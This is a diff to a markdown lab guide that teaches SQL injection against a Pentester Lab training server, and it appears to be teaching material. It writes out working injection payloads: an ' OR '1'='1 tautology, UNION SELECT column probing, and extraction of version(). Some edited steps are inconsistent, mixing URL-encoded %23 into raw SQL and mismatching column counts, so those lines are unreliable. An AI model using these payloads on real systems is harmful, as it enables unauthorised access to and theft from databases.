@@ -50,7 +50,7 @@ ping <Pentester Lab IP Address>
 
 ### **4. Access the Web Application**  
 1. Open **Firefox** (or any web browser) in your Kali Linux environment:  
-   ```bash
+   ```
    firefox &
    ```  
 2. In the address bar, enter the IP address of the Pentester Lab server:  
@@ -67,33 +67,23 @@ Familiarize yourself with the web application hosted on the ISO server. This wil
 
 #### **Expected SQL Query**:  
 **Original Query**:  
-```sql
+```
 SELECT id, name, age FROM table WHERE name='root'
 ```  
 **Injected Query**:  
-```sql
+```
 SELECT id, name, age FROM table WHERE name='root' OR '1'='1'
 ```  
 **Result**: This returns all records in the table.  
 
 #### **Payload/URL Format**:  
-**Payload**:  
-```
-uri?name=root' OR '1'='1
-```  
-**Expected SQL**:  
-```sql
-SELECT id, name, age FROM table WHERE name='root' OR '1'='1'
-```  
-
-**With URL Encoding**:  
-**Modified Payload**:  
+**Payload with URL encoding**:  
 ```
 uri?name=root' OR '1'='1' %23
 ```  
-**Comment Effect**: After removing the comment, the query simplifies to:  
-```sql
-SELECT id, name, age FROM table
+**Expected SQL**:  
+```
+SELECT id, name, age FROM table WHERE name='root' OR '1'='1' #'
 ```  
 
 ---
@@ -106,22 +96,22 @@ SELECT id, name, age FROM table
 url?name=root' UNION SELECT null %23
 ```  
 **Expected SQL**:  
-```sql
+```
 SELECT id, name, age FROM table WHERE name='root' UNION SELECT null #'
 ```  
 **Result**: This returns nothing because the column numbers must match.  
 
 #### **Determining Column Numbers**:  
 - **Testing with Nulls**:  
-  ```sql
-  SELECT id, name, age FROM table WHERE name='root' UNION SELECT null, null, null
+  ```
+  SELECT id, name, age FROM table WHERE name='root' UNION SELECT null, null, null %23
   ```  
 - **Testing with More Columns**:  
-  ```sql
-  SELECT id, name, age FROM table WHERE name='root' UNION SELECT null, null, null, null, null
+  ```
+  SELECT id, name, age FROM table WHERE name='root' UNION SELECT null, null, null, null, null %23
   ```  
 - **Successful Injection**: After determining the number of columns, students can inject real data:  
-  ```sql
+  ```
   SELECT id, name, age FROM table WHERE name='root' UNION SELECT 1, 'goksel', 30
   ```  
 
@@ -149,7 +139,7 @@ SELECT id, name, age FROM table WHERE name='root' UNION SELECT null #'
 url?name=root' UNION SELECT 1, version(), 3, 4, 5 %23
 ```  
 **Expected SQL**:  
-```sql
+```
 SELECT id, name, age FROM table WHERE name='root' UNION SELECT 1, version(), 3, 4, 5 #'
 ```  
 
